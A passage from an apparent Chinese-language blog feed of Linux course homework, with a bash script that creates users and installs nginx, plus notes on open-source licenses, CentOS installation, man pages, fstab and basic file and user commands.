      <category>第三周</category>
      
    </categories>
    
    
    <tags>
      
      <tag>N80</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>N80-第二周作业</title>
    <link href="/2023/07/03/N80%E7%AC%AC%E5%85%AD%E8%8A%82%20%E7%AC%AC2%E5%91%A8%E4%BD%9C%E4%B8%9A/"/>
    <url>/2023/07/03/N80%E7%AC%AC%E5%85%AD%E8%8A%82%20%E7%AC%AC2%E5%91%A8%E4%BD%9C%E4%B8%9A/</url>
    
    <content type="html"><![CDATA[<p>#N80054-完成作业</p><ol><li>运行脚本可以显示出本机的ip地址</li><li>如果ip地址中有3这个数字，那么就打印出当前的系统时间</li><li>如果ip地址中不含3这个数字，就批量建立用户magedu_00, magedu_01, … magedu_100并且所有用户同属于magedu组</li><li>打印出/etc/passwd这个文件中可以登陆的用户（非/usr/sbin/nologin）</li><li>yum安装nginx服务，并且启动该服务</li><li>一个脚本完成</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></div></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">########################################</span><br><span class="hljs-comment">#Author:Catyer</span><br><span class="hljs-comment">#time:2022-08-02_20:56:32</span><br><span class="hljs-comment">#filename:1.sh</span><br><span class="hljs-comment">#Script description:</span><br><span class="hljs-comment">########################################</span><br><br><span class="hljs-comment">##适应不同的机器网卡名</span><br>DATE=`<span class="hljs-built_in">date</span>`<br>IP=`hostname -I | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>OS=`awk -F= <span class="hljs-string">&#x27;/ID/&#123;print $2&#125;&#x27;</span> /etc/os-release | <span class="hljs-built_in">head</span> -n 1 | sed <span class="hljs-string">&#x27;s/\&quot;//g&#x27;</span>` <br><span class="hljs-comment">#pass=`cat /dev/urandom | tr -dc [:alnum:] | head -c 8`</span><br><br><span class="hljs-function"><span class="hljs-title">IP</span></span>()&#123;<br><span class="hljs-comment">#local IP=`ifconfig eth0 | awk /netmask/&#x27;&#123;print $2&#125;&#x27;`</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;本机IP：<span class="hljs-variable">$IP</span>&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">IPCHECK</span></span>()&#123;<br><span class="hljs-comment">#DATE=`date`</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$IP</span><br><br><span class="hljs-comment">#IPcheck=`ifconfig eth0 | awk /netmask/&#x27;&#123;print $2&#125;&#x27; | grep 3`</span><br>hostname -I | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | grep 3 &amp;&gt; /dev/null<br><span class="hljs-keyword">if</span> [ $? -eq 0 ] ;<span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$DATE</span>&quot;</span><br><span class="hljs-keyword">else</span><br>[ <span class="hljs-string">&quot;grep magedu /etc/group&quot;</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;group exist&quot;</span> || groupadd madedu<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..20&#125;;<span class="hljs-keyword">do</span><br><span class="hljs-built_in">local</span> pass=`<span class="hljs-built_in">cat</span> /dev/urandom | <span class="hljs-built_in">tr</span> -dc [:alnum:] | <span class="hljs-built_in">head</span> -c 8`<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$i</span> -lt 10 ];<span class="hljs-keyword">then</span><br>useradd magedu_0<span class="hljs-variable">$i</span> -g magedu<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$pass</span> | passwd --stdin magedu_0<span class="hljs-variable">$i</span> &amp;&gt; /dev/null ;<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;magedu_0<span class="hljs-variable">$i</span> create&quot;</span> <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;username:magedu_0<span class="hljs-variable">$i</span> passwd:<span class="hljs-variable">$pass</span>&quot;</span> &gt;&gt; /script/homework/pass.txt<br><span class="hljs-keyword">else</span><br>useradd magedu_<span class="hljs-variable">$i</span> -g magedu<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$pass</span> | passwd --stdin magedu_<span class="hljs-variable">$i</span> &amp;&gt; /dev/null ;<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;magedu_<span class="hljs-variable">$i</span> create&quot;</span> <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;username:magedu_<span class="hljs-variable">$i</span> passwd:<span class="hljs-variable">$pass</span>&quot;</span> &gt;&gt; /script/homework/pass.txt<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">cat</span> /script/homework/pass.txt<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">USER</span></span>()&#123;<br>grep -v <span class="hljs-string">&quot;/sbin/nologin&quot;</span> /etc/passwd | awk -F: <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">NGINX</span></span>()&#123;<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$OS</span> == <span class="hljs-string">&quot;centos&quot;</span> ] ;<span class="hljs-keyword">then</span><br>rpm -q nginx &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nginx install&quot;</span> || yum -y install nginx;systemctl <span class="hljs-built_in">enable</span> --now nginx<br><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$OS</span> == <span class="hljs-string">&quot;ubuntu&quot;</span> ] ;<span class="hljs-keyword">then</span><br><span class="hljs-comment">##ubuntu自动启动服务</span><br>apt list --installed | grep nginx &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ubuntu nginx is installed&quot;</span> || apt update; apt -y install nginx <br>        <span class="hljs-keyword">else</span><br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;invalid <span class="hljs-variable">$OS</span>&quot;</span>   <br><span class="hljs-keyword">fi</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nginx test&quot;</span> &gt; /usr/share/nginx/html/index.html<br>systemctl <span class="hljs-built_in">enable</span> --now nginx<br>curl <span class="hljs-variable">$IP</span><br>&#125;<br><br><br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">========================我是分隔符========================</span><br><span class="hljs-string">        week 2 homework</span><br><span class="hljs-string">1.输出本机IP地址</span><br><span class="hljs-string">2.判断IP地址是否含有3(打印系统时间/创建用户)</span><br><span class="hljs-string">3.打印出/etc/passwd可以登陆的用户（非/usr/sbin/nologin）</span><br><span class="hljs-string">4.安装nginx服务，并且启动该服务(centos/ubuntu)</span><br><span class="hljs-string">5.exit</span><br><span class="hljs-string">========================我是分隔符========================</span><br><span class="hljs-string"></span><br><span class="hljs-string">EOF</span><br><span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;please input your num: &quot;</span> num <span class="hljs-comment">##这里注意不要写成$num变量</span><br><span class="hljs-keyword">case</span> <span class="hljs-variable">$num</span> <span class="hljs-keyword">in</span><br>1) IP;;<br>2) IPCHECK;;<br>3) USER;;<br>4) NGINX;;<br>5|e|E|<span class="hljs-built_in">exit</span>|Exit) <span class="hljs-built_in">break</span> ;;<br>*) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;error input&quot;</span><br><span class="hljs-keyword">esac</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h1 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h1><h2 id="1-运行界面"><a href="#1-运行界面" class="headerlink" title="1.运行界面"></a>1.运行界面</h2><p><img src="2792175-20220829233313227-895948155.png" alt="image-20220807144527883"></p><h2 id="2-输出IP地址"><a href="#2-输出IP地址" class="headerlink" title="2.输出IP地址"></a>2.输出IP地址</h2><p><img src="2792175-20220829233313511-890870128.png" alt="image-20220807144550302"></p><h2 id="3-判断是否有3，否则创建用户"><a href="#3-判断是否有3，否则创建用户" class="headerlink" title="3.判断是否有3，否则创建用户"></a>3.判断是否有3，否则创建用户</h2><p><img src="2792175-20220829233313824-1452105164.png" alt="image-20220807144846107"></p><h2 id="创建随机密码"><a href="#创建随机密码" class="headerlink" title="创建随机密码"></a>创建随机密码</h2><p><img src="2792175-20220829233314127-164339639.png" alt="image-20220807144905901"></p><h2 id="4-输出nologin用户"><a href="#4-输出nologin用户" class="headerlink" title="4.输出nologin用户"></a>4.输出nologin用户</h2><p><img src="2792175-20220829233314425-1921308566.png" alt="image-20220807144923382"></p><h2 id="5-安装nginx"><a href="#5-安装nginx" class="headerlink" title="5.安装nginx"></a>5.安装nginx</h2><p><img src="2792175-20220829233314716-354378054.png" alt="image-20220807145254152"></p><p>nginx测试页：nginx test</p>]]></content>
    
    
    <categories>
      
      <category>第六节</category>
      
    </categories>
    
    
    <tags>
      
      <tag>第二周</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>N80第五节 第1周作业</title>
    <link href="/2023/07/01/N80%E7%AC%AC%E4%BA%94%E8%8A%82-%E7%AC%AC1%E5%91%A8%E4%BD%9C%E4%B8%9A/"/>
    <url>/2023/07/01/N80%E7%AC%AC%E4%BA%94%E8%8A%82-%E7%AC%AC1%E5%91%A8%E4%BD%9C%E4%B8%9A/</url>
    
    <content type="html"><![CDATA[<p>#N80054-完成作业</p><ol><li>图文并茂解释开源许可证 GPL、BSD、MIT、Mozilla、Apache和LGPL的区别？</li></ol><p><img src="1614236867231-1688223725835-38-1688223726975-40.png" alt="1614236867231"></p><p>GPL：来源自由软件联盟GNU，GPL/LGPL侧重于代码及衍生代码的开源与免费使用。GPL协议的主要内容是只要在一个软件中使用GPL协议的产品，则该软件产品必须也采用GPL协议，既必须也是开源和免费。GPL协议的产品作为一个单独的产品使用没有任何问题，还可以享受免费的优势。GPL的出发点是代码的开源/免费使用和引用/修改/衍生代码的开源/免费使用，但不允许修改后和衍生的代码做为闭源的商业软件发布和销售。</p><p>BSD：BSD是”Berkeley Software Distribution”的缩写，意思是”伯克利软件发行版”。BSD开源协议是一个给于使用者很大自由的协议。可以自由的使用，修改源代码，也可以将修改后的代码作为开源或者专有软件再发布。 当你发布使用了BSD协议的代码，或则以BSD协议代码为基础做二次开发自己的产品时，需要满足三个条件：<br>1．如果再发布的产品中包含源代码，则在源代码中必须带有原来代码中的BSD协议。<br>2．如果再发布的只是二进制类库/软件，则需要在类库/软件的文档和版权声明中包含原来代码中的BSD协议。<br>3．不可以用开源代码的作者/机构名字和原来产品的名字做市场推广。<br>BSD代码鼓励代码共享，但需要尊重代码作者的著作权。BSD由于允许使用者修改和重新发布代码，也允许使用或在BSD代码上开发商业软件发布和销售，因此是对商业集成很友好的协议。</p><p>MIT：MIT是和BSD一样宽范的许可协议,源自麻省理工学院（Massachusetts Institute of Technology, MIT）。作者只想保留版权,而无任何其他了限制。MIT与BSD类似，但是比BSD协议更加宽松，是目前最少限制的协议。这个协议唯一的条件就是在修改后的代码或者发行包包含原作者的许可信息。适用商业软件。使用MIT的软件项目有：jquery、Node.js。</p><p>Mozilla：Mozilla公共许可证（英语：Mozilla Public License，简称MPL）是个自由、开源、详细的软件许可证，由Mozilla基金会开发并维护。该协议融合了BSD许可证和GNU通用公共许可协议的特性，追求平衡专有软件和开源软件开发者之间的顾虑。MPL允许在其授权下的源代码与其他授权的文件进行混合，包括私有许可证。但在MPL授权下的代码文件必须保持MPL授权，并且保持开源。</p><p>Apache：Apache License（Apache许可证），是Apache软件基金会发布的一个自由软件许可证。该协议和BSD类似，同样鼓励代码共享和最终原作者的著作权，同样允许源代码修改和再发布。但是也需要遵循以下条件：<br>1.需要给代码的用户一份Apache Licence。<br>2.如果修改了代码，需要再被修改的文件中说明。<br>3.在衍生的代码中（修改和有源代码衍生的代码中）需要带有原来代码中的协议，商标，专利声明和其他原来作者规定需要包含的说明。<br>使用这个协议的好处是:永久权利 一旦被授权，永久拥有。全球范围的权利 在一个国家获得授权，适用于所有国家。假如你在美国，许可是从印度授权的，也没有问题。授权免费 无版税， 前期、后期均无任何费用。授权无排他性 任何人都可以获得授权授权不可撤消 一旦获得授权，没有任何人可以取消。比如，你基于该产品代码开发了衍生产品，你不用担心会在某一天被禁止使用该代码</p><p>LGPL：GNU宽通用公共许可证，简称LGPL(GNU Lesser General Public License)，被用于一些GNU程序库。这个许可证以前被称为GNU库(Library)通用公共许可证。LGPL是GPL的一个为主要为类库使用设计的开源协议。LGPL是GPL的变种，也是GNU为了得到更多的甚至是商用软件开发商的支持而提出的。与GPL的最大不同是，可以私有使用LGPL授权的自由软件，开发出来的新软件可以是私有的而不需要是自由软件。所以任何公司在使用自由软件之前应该保证在LGPL或其它GPL变种的授权下。但是如果修改LGPL协议的代码或者衍生，则所有修改的代码，涉及修改部分的额外代码和衍生的代码都必须采用LGPL协议。因此LGPL协议的开源代码很适合作为第三方类库被商业软件引用。GPL/LGPL都保障原作者的知识产权，避免有人利用开源代码复制并开发类似的产品。</p><ol><li><p>安装各发行版系统的安装(centos, rockylinux, ubuntu, 等) 【任选1个】 1.软硬件准备</p><p>软件：推荐使用 VMware，我用的是 VMware 12</p><p>镜像：CentOS6 ,如果没有镜像可以在阿里云下载 <a href="https://mirrors.aliyun.com/centos/">centos安装包下载_开源镜像站-阿里云</a></p><p><img src="1564741127-6742-6852280-6016d328a294afaa.png" alt="img"></p><p>硬件：因为是在宿主机上运行虚拟化软件安装centos，所以对宿主机的配置有一定的要求。最起码I5CPU双核、硬盘500G、内存4G以上。</p><p><img src="1564741127-8621-6852280-65cf11e662ddb6fa.png" alt="img"></p><h3 id="2-虚拟机准备"><a href="#2-虚拟机准备" class="headerlink" title="2.虚拟机准备"></a>2.虚拟机准备</h3><p>1.打开VMware选择新建虚拟机</p><p><img src="1564741127-8160-6852280-f77b143952798416.png" alt="img"></p><p>2.典型安装与自定义安装</p><p>典型安装：VMware会将主流的配置应用在虚拟机的操作系统上，对于新手来很友好。</p><p>自定义安装：自定义安装可以针对性的把一些资源加强，把不需要的资源移除。避免资源的浪费。</p><p>这里我选择自定义安装。</p><p><img src="1564741127-7673-6852280-15cf157374d2efa3.png" alt="img"></p><p>3.虚拟机兼容性选择</p><p>这里要注意兼容性，如果是VMware12创建的虚拟机复制到VM11、10或者更低的版本会出现一不兼容的现象。如果是用VMware10创建的虚拟机在VMware12中打开则不会出现兼容性问题。</p><p><img src="1564741127-8184-6852280-a3a071809202f96c.png" alt="img"></p><p>4.选择稍后安装操作系统</p><p><img src="1564741128-9117-6852280-dedd2c755b23a861.png" alt="img"></p><p>5.操作系统的选择</p><p>这里选择之后安装的操作系统，正确的选择会让vm tools更好的兼容。这里选择linux下的CentOS</p><p><img src="1564741128-7947-6852280-737966b7f1b4d699.png" alt="img"></p><p>6.虚拟机位置与命名</p><p>虚拟机名称就是一个名字，在虚拟机多的时候方便自己找到。</p><p>VMware的默认位置是在C盘下，我这里改成F盘。</p><p><img src="1564741128-6505-6852280-e8218062ff2ad62c.png" alt="img"></p><p>7.处理器与内存的分配</p><p>处理器分配要根据自己的实际需求来分配。在使用过程中CPU不够的话是可以再增加的。这次只做安装CentOS演示，所以处理器与核心都选1.</p><p><img src="1564741128-4035-6852280-3fbd3ba6ef3db5c3.png" alt="img"></p><p>内存也是要根据实际的需求分配。我的宿主机内存是8G所以我给虚拟机分配2G内存。</p><p><img src="1564741129-7800-6852280-ee1ff4143a1f2904.png" alt="img"></p><p>8.网络连接类型的选择，网络连接类型一共有桥接、NAT、仅主机和不联网四种。</p><p>桥接：选择桥接模式的话虚拟机和宿主机在网络上就是平级的关系，相当于连接在同一交换机上。</p><p>NAT：NAT模式就是虚拟机要联网得先通过宿主机才能和外面进行通信。</p><p>仅主机：虚拟机与宿主机直接连起来</p><p>桥接与NAT模式访问互联网过程，如下图所示</p><p><img src="1564741129-9031-6852280-d07dc33a8be765c2.png" alt="img"></p><p><strong>桥接与NAT区别</strong></p><p>这里选择桥接模式</p><p><img src="1564741129-1671-6852280-763c60ffdfbbe98f.png" alt="img"></p><p>9.其余两项按虚拟机默认选项即可</p><p><img src="1564741129-1215-6852280-b7ffd2ce4e5dda00.png" alt="img"></p><p>10.磁盘容量</p><p>磁盘容量暂时分配100G即可后期可以随时增加，不要勾选立即分配所有磁盘，否则虚拟机会将100G直接分配给CentOS，会导致宿主机所剩硬盘容量减少。 勾选将虚拟磁盘拆分成多个文件，这样可以使虚拟机方便用储存设备拷贝复制。</p><p><img src="1564741129-8362-6852280-b482f1c7221e96e8.png" alt="img"></p><p>11.磁盘名称，默认即可</p><p><img src="1564741130-7604-6852280-954605e222159a8c.png" alt="img"></p><p>12.取消不需要的硬件</p><p>点击自定义硬件</p><p><img src="1564741131-7575-6852280-748f2d5827858c46.png" alt="img"></p><p>选择声卡、打印机等不需要的硬件然后移除。</p><p><img src="1564741130-7755-6852280-0396726c05e65267.png" alt="img"></p><p>13.点击完成，已经创建好虚拟机。</p><p><img src="1564741131-7639-6852280-8f44bd8c808496a6.png" alt="img"></p><h3 id="3-安装CentOS"><a href="#3-安装CentOS" class="headerlink" title="3.安装CentOS"></a>3.安装CentOS</h3><p>1.连接光盘</p><p>右击刚创建的虚拟机，选择设置</p><p><img src="1564741130-4879-6852280-60a45c6a565cac0a.png" alt="img"></p><p>先选择CD/DVD，再选择使用ISO映像文件，最后选择浏览找到下载好的镜像文件。启动时连接一定要勾选上后确定。</p><p><img src="1564741131-4241-6852280-954e6acf6d2fbcca.png" alt="img"></p><p>2.开启虚拟机</p><p><img src="1564741132-6485-6852280-6d6d494624515221.png" alt="img"></p><p>3.安装操作系统</p><p>开启虚拟机后会出现以下界面:</p><ul><li>Install CentOS 7 安装CentOS 7</li><li>Test this media &amp; install CentOS 7 测试安装文件并安装CentOS 7</li><li>Troubleshooting 修复故障</li></ul><p>选择第一项，安装直接CentOS 7，回车，进入下面的界面</p><p><img src="1564741132-3806-6852280-989a4d1bc37e8653.png" alt="img"></p><p>选择安装过程中使用的语言，这里选择英文、键盘选择美式键盘。点击Continue</p><p><img src="1564741132-5326-6852280-d050f186e0bfe8f9.png" alt="img"></p><p>首先设置时间</p><p><img src="1564741133-3994-6852280-f9a4c0d843e33e67.png" alt="img"></p><p>时区选择上海，查看时间是否正确。然后点击Done</p><p><img src="1564741132-4825-6852280-2de5dc94e57889cf.png" alt="img"></p><p>选择需要安装的软件</p><p><img src="1564741133-5208-6852280-8c610fe61d6453e2.png" alt="img"></p><p>选择 Server with Gui，然后点击Done</p><p><img src="1564741133-6207-6852280-9cf6c1bfc94af8aa.png" alt="img"></p><p>选择安装位置，在这里可以进行磁盘划分。</p><p><img src="1564741134-1468-6852280-e191eb949c3ade15.png" alt="img"></p><p>选择i wil configure partitioning（我将会配置分区），然后点击done</p><p><img src="1564741134-6460-6852280-ba3981d9d0abc6b2.png" alt="img"></p><p>如下图所示，点击加号，选择/boot，给boot分区分200M。最后点击Add</p><p><img src="1564741135-8053-6852280-5ccb5f9263bdea37.png" alt="img"></p><p>然后以同样的办法给其他三个区分配好空间后点击Done</p><p><img src="1564741136-6945-6852280-7499015d9886f456.png" alt="img"></p><p>然后会弹出摘要信息，点击AcceptChanges(接受更改)</p><p><img src="1564741136-3293-6852280-15c1ad128b939d3a.png" alt="img"></p><p>设置主机名与网卡信息</p><p><img src="1564741137-2746-6852280-1c3bc52d69c87514.png" alt="img"></p><p>首先要打开网卡，然后查看是否能获取到IP地址(我这里是桥接)，再更改主机名后点击Done。</p><p><img src="1564741137-7559-6852280-8e8a950ea172b810.png" alt="img"></p><p>最后选择Begin Installation(开始安装)</p><p><img src="1564741137-4187-6852280-4fcc12834c856eaa.png" alt="img"></p><p>设置root密码</p><p><img src="1564741138-1859-6852280-b040822db036b2e3.png" alt="img"></p><p>设置root密码后点击Done</p><p><img src="1564741138-5137-6852280-f69ac0f0bc2f4ec6.png" alt="img"></p><p>点击USER CREATION 创建管理员用户</p><p><img src="1564741139-1805-6852280-6772bfbb7b3f094a.png" alt="img"></p><p>输入用户名密码后点击Done</p><p><img src="1564741139-9489-6852280-062dd21af5e9d11e.png" alt="img"></p><p>等待系统安装完毕重启系统即可</p><p><img src="1564741140-4954-6852280-f9ad65ac39453b74.png" alt="img"></p></li><li><p>Linux中总结，</p><p>1）如何通过一个简短的关键字 【man -k man -k process 】，例如process 获取相关的命令。</p><p> linux中ls是“list files”的缩写,是列出文件的意思。<br> ls命令的参数详解：<br>-a 列出目录下的所有文件，包括以 . 开头的隐含文件。<br>-b 把文件名中不可输出的字符用反斜杠加字符编号(就象在C语言里一样)的形式列出。<br>-c 输出文件的 i 节点的修改时间，并以此排序。<br>-d 将目录象文件一样显示，而不是显示其下的文件。<br>-e 输出时间的全部信息，而不是输出简略信息。<br>ls -l 、ls -a 、ls -d 等。</p><p>linux中cd是Change Directory的缩写，这是用来切换工作目录的命令。<br>cd / 、cd ~ 、cd /etc/passwd 等。</p><p>2）通过命令的描述，选择一个命令，获取命令的man文档。【 man top】</p><p><img src="image-20230701203147658-1688223122376-31.png" alt="image-20230701203147658"></p><p>3）解读man文档，man分几个部分？man每个部分的解释，特别是语法部分。&lt;&gt;, [] …等各代表什么含义。</p><p>man命令是Linux下的帮助指令，通过man指令可以查看Linux中的指令帮助、配置文件帮助和编程帮助等信息。</p><p>语法：man（选项)(参数）</p><figure class="highlight inform7"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><pre><code class="hljs inform7">选项<br>   <br>-a：在所有的<span class="hljs-keyword">man</span>帮助手册中搜索。<br>   <br>-f：等价于whatis指令，显示给定关键字的简短描述信息。<br>   <br>-p：指定<span class="hljs-keyword">man</span>手册搜索的路径。<br>   <br>参数<br>   <br>数字：指定从哪本<span class="hljs-keyword">man</span>手册中搜索帮助; 关键字：指定要搜索帮助的关键字。<br>   <br>符号含义<br>   <br><span class="hljs-comment">[ ]</span>：可选内容<br>   <br>&lt;&gt;：必须给出内容<br>   <br>a|b|c：多选一<br>   <br>…：可以有多个<br></code></pre></td></tr></table></figure><p>4）根据语法部分 简要的写几个操作。</p><p><strong>man ls | more、man ssh、man cd</strong></p></li><li><p>切换到/etc/目录，列出fstab文件的详细信息，详细解决fstab一行，每个或每几个字符的详细含义。 【cd /etc; ls -l /etc/fstab】 </p><p><img src="image-20230701203233377-1688223156411-33.png" alt="image-20230701203233377"></p><p>含义分别为：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle">设备信息：如: <span class="hljs-regexp">/dev/</span>cdrom、<span class="hljs-regexp">/dev/</span>sda1、&lt;host&gt;:&lt;dir&gt;<br>   <br>挂载点：如： <span class="hljs-regexp">/、/</span>home、/boot<br>   <br>文件系统类型，如：ext4、nfs、xfs等<br>   <br>挂载选项：参考mount命令，<span class="hljs-keyword">default</span>表示使用默认选项<br>   <br>使用<span class="hljs-keyword">dump</span>命令时否需要备份该文件系统<br>   <br>重启时文件系统的监测顺序<br></code></pre></td></tr></table></figure></li><li><p>简要说明FHS结构。</p><p>FHS(Filesystem Hierarchy Standard)，即文件系统层次化标准。</p><p>FHS主要目的是为了给用户提供一个管理系统以及目录结构的一个参考，都能够遵循FHS的标准。</p><p>Linux系统目录结构</p><p>登录系统后，在当前命令窗口下输入命令：ls</p><p>Linux系统目录结构</p><p><img src="image-20230701203309473-1688223170911-35.png" alt="image-20230701203309473"></p><p>/bin：所有用户可用的基本命令程序文件。</p><p>/lib：为系统启动或根文件系统上的应用程序（/bin、/sbin等）提供共享库，以及为内核提供内核模块。</p><p>/boot：引导加载器必须用到的各种静态文件，如kernel、grub等。</p><p>/dev：设备文件与特殊文件。</p><p>/etc：系统程序的静态配置文件。</p><p>/home：普通的家目录的集中位置，一般每个普通用户的家目录默认为此目录下与用户名同名的子目录。</p><p>/root：管理员的家目录。</p><p>/mnt：挂载点目录，通常挂载额外的临时文件系统。</p><p>/sys：sysfs虚拟文件系统提供了一种比proc更为理想的访问内核数据的途径；其主要作用在于为管理Linux设备提供一种统一模型的的接口。</p><p>/run：存放动态的，不持久的应用程序运行数据。</p><p>/sbin：供管理员的使用的工具程序。</p><p>/tmp：临时文件。</p><p>/user：全局共享的只读数据路径。</p></li><li><p>用自己的理解总结 文件管理，用户管理，组用户，权限管理相关的命令。文件: 【touch/rm/rmdir/cat/head/less/more】。用户及组：user/group 【useradd/userdel/usermode; groupadd/groupdel/groupmod; chsh/…】。权限 【chmod/chown/setfacl】”</p></li></ol><p>文件管理：<br>touch 文件名：创建一个空文件。</p><p>cat 文件名：查看文件内容，适用于内容较少的文件。</p><p>head 文件名：默认查看文件前10行内容。</p><p>tail 文件名：默认查看文件后10行内容。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">选项<span class="hljs-operator">-f</span>：会把文件里的最尾部内容显示在屏幕上，并且不断刷新，常用于查阅正在改变的日志文件。<br></code></pre></td></tr></table></figure><p>more文件名：分页显示，适用于内容较多的文件。</p><p>less： 与 more 类似，但是比 more 更好的是，他可以往前翻页。</p><p>rm ：删除文件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs diff">选项：<br><br><span class="hljs-deletion">-f：不提示，强制删除文件或目录；</span><br><br> -i：删除已有文件或目录之前先询问用户；<br><br><span class="hljs-deletion">-r,-R：递归删除，将指定目录下的所有文件与子目录一并删除；</span><br><br> -v：显示指令的详细执行过程。<br></code></pre></td></tr></table></figure><p>mv：移动文件，若目标文件已经存在时，会覆盖。</p><p>cp ：文件复制</p><p>用户管理：<br>useradd：创建新用户</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ldif">选项：<br><br><span class="hljs-literal">-</span>u UID: <span class="hljs-comment">#指定用户UID号</span><br><br><span class="hljs-literal">-</span>d 家目录：<span class="hljs-comment">#指定用户家目录</span><br><br><span class="hljs-literal">-</span>g 组名：<span class="hljs-comment">#指定用户的初始组</span><br><br><span class="hljs-literal">-</span>G 组名：<span class="hljs-comment">#指定用户的附加组</span><br><br><span class="hljs-literal">-</span>s SHELL：<span class="hljs-comment">#指定用户登陆的shell，默认为/bin/bash</span><br></code></pre></td></tr></table></figure><p>usermod：修改用户权限</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 